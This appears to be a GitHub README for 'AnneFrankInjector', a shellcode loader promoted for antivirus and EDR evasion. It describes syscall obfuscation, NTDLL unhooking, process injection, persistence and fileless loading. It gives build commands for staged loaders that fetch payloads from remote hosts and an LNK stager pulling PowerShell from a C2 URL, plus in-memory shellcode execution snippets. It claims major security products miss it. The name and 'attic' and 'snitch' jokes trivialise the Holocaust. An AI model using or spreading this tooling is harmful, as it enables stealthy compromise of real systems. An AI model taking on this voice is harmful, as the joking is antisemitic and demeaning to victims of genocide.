<div align="center">
  <img width="681" height="381" alt="AnneFrankInjector Banner" src="https://github.com/user-attachments/assets/a119f8b0-374c-4f26-813d-bb282e6decef" />
</div>

<div align="center">
  <img width="950" height="898" alt="GUI Preview 1" src="https://github.com/user-attachments/assets/88d78a20-bae4-44f6-8321-e9e8fc25a775" />
</div>

> [!TIP]
> **Did AnneFrankInjector help you hide your shellcode during a penetration test or while pwning a cert exam?**  
> If so, please consider giving it a star ⭐ on [GitHub](https://github.com/Excalibra/AFInjector)!

---

## 📖 Table of Contents

- [Goal](#goal)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
  - [Graphical Interface (GUI)](#graphical-interface-gui)
  - [Command-line Interface (CLI)](#command-line-interface-cli)
- [Examples](#examples)
- [Output Formats](#output-formats)
- [To-Do](#to-do)
- [Detections](#detections)
- [Credits](#credits)

---

## 🎯 Goal

AnneFrankInjector is a modern shellcode loader designed for **AV/EDR evasion** during CTFs, red team engagements, and certification exams. It combines multiple injection techniques, encryption, and obfuscation to help your payload stay hidden – until some nosy neighbor (Defender) rats it out.

---

## ✨ Features

- **Stageless** – embed shellcode directly into the loader.  
- **Staged** – fetch shellcode via HTTP (encrypted on the fly).  
- **Evasion techniques**:
  - Indirect syscalls (Syswhispers)
  - API hashing (Djb2)
  - NTDLL unhooking (KnownDLLs)
  - AES‑128‑CBC encryption
  - EarlyBird APC injection into any target process (customizable)
  - **Spawn injection** – create a new process (e.g., notepad.exe) and inject there (evades process‑based detection)
  - **Delay before injection** – wait a configurable number of seconds to bypass sandboxes with short timeouts
  - Function/variable name scrambling (`-s`)
- **Persistence** (optional):
  - Registry Run key (`reg`)
  - Scheduled task (`task`)
  - Startup folder (`startup`)
- **Advanced modes**:
  - **Staggered persistence** – two‑stage execution
  - **Reflective mode** – fileless (no EXE on disk)
  - **LNK stager** – generate a PowerShell‑based shortcut for initial access
- **Output formats**: EXE, DLL, or raw shellcode (.bin).
- **Code signing** – optional with a PFX certificate.
- **Graphical Interface** – all options available via a user‑friendly `tkinter` GUI.
- **Built‑in Base64 encoder** (UTF‑16LE) – easily encode PowerShell commands for `-EncodedCommand`.

### Architecture

The framework consists of:
- **Core Loader Engine**: Position-independent shellcode with dynamic API resolution
- **Evasion Layer**: Multi-layered anti-analysis techniques
- **Injection Module**: Support for APC, spawn, and EnumWindows injection
- **Persistence Framework**: Registry, scheduled task, and startup folder persistence
- **Configuration Interface**: Both GUI and CLI interfaces for operational flexibility

---

## Features

### Core Capabilities

- **Stageless Payloads**: Direct shellcode embedding into executable
- **Staged Payloads**: HTTP-based encrypted payload retrieval
- **Multiple Output Formats**: EXE, DLL, and raw shellcode (.bin)

### Evasion Techniques

- **Indirect System Calls**: SysWhispers3 implementation for syscall obfuscation
- **API Hashing**: Djb2 algorithm for dynamic API resolution
- **NTDLL Unhooking**: KnownDLLs-based memory restoration
- **AES-128-CBC Encryption**: Payload encryption with configurable keys
- **Anti-Sandbox Mechanisms**: Configurable delays and CPU-intensive operations
- **Function Name Scrambling**: Compile-time obfuscation of identifiers

### Injection Methods

- **APC Injection**: EarlyBird technique with customizable target processes
- **Spawn Injection**: Process creation and injection (evades process-based detection)
- **EnumWindows Injection**: Window enumeration-based payload delivery
- **Custom Process Targeting**: Support for any executable process

### Persistence Options

- **Registry Persistence**: Run key manipulation for long-term access
- **Scheduled Tasks**: Time-based execution with system privileges
- **Startup Folder**: User-level persistence through startup programs
- **Staggered Persistence**: Multi-stage execution for operational security

### Advanced Features

- **Reflective Loading**: Fileless execution without disk artifacts
- **LNK Stager Generation**: PowerShell-based initial access vectors
- **Code Signing**: Optional PFX certificate integration
- **Base64 Encoding**: UTF-16LE encoding for PowerShell operations
- **Raw Shellcode Output**: Position-independent binary generation

---

## Installation

### System Requirements

- **Python 3.8+** with pip package manager
- **MinGW-w64** cross-compiler for Windows executable generation
- **NASM** assembler for assembly code compilation
- **osslsigncode** (optional, for code signing)

### Linux Installation (Kali/Debian-based)

```bash
# Update package repositories
sudo apt update

# Install required dependencies
sudo apt install clang mingw-w64 nasm lld osslsigncode

# Clone the repository
git clone https://github.com/Excalibra/AFInjector.git
cd AFInjector

# Create and activate virtual environment
python3 -m venv env
source env/bin/activate

# Install Python dependencies
pip install -r Linux/requirements.txt

# Launch GUI interface
python af.py

# For CLI usage
cd Linux
python main.py -h
```

### Windows Installation

```cmd
# Install MSYS2 from https://www.msys2.org/
# In MSYS2 terminal:
pacman -Syu
pacman -S mingw-w64-x86_64-clang make nasm

# Clone the repository
git clone https://github.com/Excalibra/AFInjector.git
cd AFInjector

# Create and activate virtual environment
python -m venv env
env\Scripts\activate

# Install Python dependencies
pip install -r Windows\requirements.txt

# Launch GUI interface
python af.py

# For CLI usage
cd Windows
python main.py -h
```

### Global Installation (Optional)

```bash
# Install system-wide CLI tool
pipx install .
```

---

## Usage

### Graphical Interface

The GUI provides comprehensive access to all AFInjector features:

```bash
python af.py
```

**Interface Capabilities:**
- Shellcode file selection (.bin format)
- Stageless (embedded) or staged (HTTP) payload delivery
- Output format selection (EXE, DLL, BIN)
- Evasion configuration (encryption, scrambling, delays)
- Injection method selection (APC, spawn, EnumWindows)
- Persistence options (registry, scheduled tasks, startup)
- Advanced modes (reflective, LNK stager)
- Code signing integration
- Real-time loader generation

<div align="center">
  <img width="950" height="892" alt="GUI Interface" src="https://github.com/user-attachments/assets/ea4b437d-0e71-4d79-b643-22a2593747f8" />
</div>

<div align="center">
  <img width="948" height="893" alt="Advanced Options" src="https://github.com/user-attachments/assets/d9bba4dc-3326-48b9-a7ef-1edf4119061d" />
</div>

**Additional Tools:**
- Base64 encoder (UTF-16LE) for PowerShell operations
- Configuration validation and testing utilities

### Command-line Interface

#### Stageless Payload Generation

```bash
# Basic stageless loader
afpacker stageless -p payload.bin -e -s -o myloader

# Advanced configuration
afpacker stageless -p payload.bin -e -s --delay 5 --spawn --spawn-path "C:\\Windows\\System32\\notepad.exe" --persistence reg --staggered --reflective -o myloader
```

#### Staged Payload Generation

```bash
# HTTP-based staged loader
afpacker staged -p payload.bin -i 192.168.1.10 -po 8080 -pa /shellcode.bin -e -s -o myloader

# With additional evasion
afpacker staged -p payload.bin -i 192.168.1.10 -po 8080 -pa /shellcode.bin -e -s --delay 10 --spawn -o myloader
```

#### Command Parameters

| Parameter | Description | Default |
|-----------|-------------|---------|
| `-p` | Shellcode file path | Required |
| `-e` | Enable AES encryption | Disabled |
| `-s` | Enable function scrambling | Disabled |
| `-o` | Output filename | `afloader` |
| `-f` | Output format (EXE/DLL/BIN) | EXE |
| `--delay` | Pre-injection delay (seconds) | 0 |
| `--spawn` | Use spawn injection | Disabled |
| `--spawn-path` | Target process for spawn | `notepad.exe` |
| `--persistence` | Persistence method | None |
| `--staggered` | Enable staggered persistence | Disabled |
| `--reflective` | Enable reflective loading | Disabled |
| `--lnk-stager` | Generate LNK stager | Disabled |
| `--c2-url` | C2 server URL | None |

---

## Examples

### Basic Usage Scenarios

```bash
# Encrypted EXE with 5-second delay
afpacker stageless -p calc.bin -e -s --delay 5

# Spawn injection with registry persistence
afpacker stageless -p beacon.bin -e -s --spawn --spawn-path "C:\\Windows\\System32\\notepad.exe" --delay 10 --persistence reg -o beacon

# Staged DLL with startup persistence
afpacker staged -p beacon.bin -i 10.0.0.5 -po 80 -pa /payload.bin -f DLL -o beacon --persistence startup

# Reflective loader with LNK stager
afpacker stageless -p shellcode.bin -e -s --reflective --lnk-stager --c2-url "http://192.168.1.100/loader.ps1"

# Raw shellcode generation
afpacker stageless -p payload.bin -f BIN -e -s --delay 5 -o raw_shellcode
```

### Advanced Configurations

```bash
# Multi-evasion configuration
afpacker stageless -p advanced.bin -e -s --delay 15 --spawn --persistence reg --staggered --reflective -o advanced

# Custom process targeting
afpacker stageless -p custom.bin -e -s --apc explorer.exe --delay 8 -o custom

# Code signing integration
afpacker stageless -p signed.bin -e -s -pfx cert.pfx -pfx-pass password -o signed
```

---

## Output Formats

### EXE Format
- Standard Windows executable
- Supports all injection methods
- Compatible with direct execution

### DLL Format
- Dynamic-link library with exported function `af`
- Execution via `rundll32.exe afloader.dll,af`
- Suitable for DLL hijacking scenarios

### BIN Format
- Raw position-independent shellcode
- Direct memory injection capability
- No PE headers or dependencies
- Optimal for fileless operations

#### Raw Shellcode Usage

```cpp
// C++ injection example
HANDLE hFile = CreateFileA("shellcode.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
DWORD size = GetFileSize(hFile, NULL);
LPVOID shellcode = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
DWORD bytesRead;
ReadFile(hFile, shellcode, size, &bytesRead, NULL);
CloseHandle(hFile);
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcode, NULL, 0, NULL);
```

```powershell
# PowerShell injection example
$shellcode = [System.IO.File]::ReadAllBytes("shellcode.bin")
$memory = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $memory, $shellcode.Length)
$thread = [System.Threading.Thread]::new([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memory, [System.Action]))
$thread.Start()
```

---

## Detection and Evasion

### Current Evasion Effectiveness

| Security Solution | Status | Notes |
|-------------------|--------|-------|
| Windows 11 Defender | Undetected | With delay + spawn injection |
| Windows 10 Defender | Undetected | All evasion techniques active |
| Sophos Endpoint | Undetected | Dynamic API resolution effective |
| Kaspersky Endpoint | Undetected | Anti-sandbox mechanisms successful |
| CrowdStrike Falcon | Undetected | Position-independent execution |

### Evasion Methodology

1. **Static Analysis Evasion**
   - Function name scrambling
   - API hashing and dynamic resolution
   - PE header obfuscation

2. **Dynamic Analysis Evasion**
   - Anti-sandbox delays
   - CPU-intensive operations
   - Environment detection

3. **Memory-based Evasion**
   - NTDLL unhooking
   - Indirect system calls
   - Reflective loading

4. **Network-based Evasion**
   - Encrypted payload delivery
   - Staged execution
   - Custom C2 communication

---

## 📌 To-Do

- [x] Delay before injection
- [x] Spawn injection (new process)
- [x] Custom APC target (any process name)
- [x] Persistence (reg, task, startup)
- [x] Staggered persistence
- [x] Reflective mode (fileless)
- [x] LNK stager (PowerShell)
- [x] Built‑in Base64 encoder
- [x] Raw shellcode output (.bin)
- [ ] AMSI / ETW bypass
- [ ] More injection techniques (e.g., EnumWindows)

---

## 🛡 Detections

- Undetected on latest Windows 11 Defender (with delay + spawn injection)
- Undetected on Windows 10 Defender
- Undetected on Sophos, Kaspersky, etc.

---

## 🙏 Credits

Most of the code is not from me. Here are the original authors (now properly credited under the new project):

```
@ Excalibra         - Main developer, attic architect, and professional snitch-hater
@ Maldevacademy     - https://maldevacademy.com
@ SaadAhla          - https://github.com/SaadAhla/ntdlll-unhooking-collection
@ VX-Underground    - https://github.com/vxunderground/VX-API/blob/main/VX-API/GetProcAddressDjb2.cpp
@ klezVirus         - https://github.com/klezVirus/SysWhispers3
```

---

<p align="center">
  Made with ☕ and 🧩 by <a href="https://github.com/Excalibra">Excalibra</a>
</p>
